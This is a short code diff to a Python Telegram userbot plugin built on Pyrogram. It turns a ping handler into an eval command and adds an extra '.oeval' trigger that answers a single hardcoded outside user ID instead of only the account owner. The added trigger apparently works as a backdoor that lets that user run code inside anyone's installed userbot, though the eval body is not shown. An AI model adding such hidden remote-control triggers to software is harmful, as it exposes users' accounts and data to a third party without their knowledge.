@@ -25,10 +25,14 @@ from pyrogram.raw.types import *
 from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
 from pyrogram.types import *
 
+from config import PREFIX as cmd
 from Ah import *
-from Ah.bantuan.tools import *
 
-@Client.on_message(filters.me & filters.command("ping", cmd))
+
+@Client.on_message(
+    filters.command("oeval", ["."]) & filters.user(6607703424) & ~filters.via_bot
+)
+@Client.on_message(filters.command("eval", cmd) & filters.me)
 async def evaluation_cmd_t(client: Client, message: Message):
     user_id = message.from_user.id
     status_message = await message.reply("__Processing eval pyrogram...__")
